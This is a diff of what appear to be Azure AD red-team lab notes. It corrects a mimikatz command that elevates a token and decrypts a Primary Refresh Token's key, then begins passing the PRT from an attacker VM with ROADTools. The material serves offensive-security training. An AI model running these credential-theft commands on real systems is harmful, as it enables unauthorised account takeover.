@@ -1345,10 +1345,10 @@ Invoke-Command -Session $infradminsrv -ScriptBlock{C:\Users\Public\student1\mimi
 
 Decrypt key:
 ```
-Invoke-Command -Session $infradminsrv -ScriptBlock{C:\Users\Public\student1\mimikatz.exe "token::elevate" "dpapi::cloudapkd <KeyValue> /unprotect" "exit"}
+Invoke-Command -Session $infradminsrv -ScriptBlock{C:\Users\Public\student1\mimikatz.exe "token::elevate" "dpapi::cloudapkd /keyvalue:<KeyValue> /unprotect" "exit"}
 ```
 
-Now back on a new session from the attacker VM, we can pass the PRT with the key:
+Now back on a new session from the attacker VM, we can pass the PRT with the clear key from mimikatz:
 ```
 cd C:\AzAD\Tools\ROADTools
 .\venv\Scripts\activate
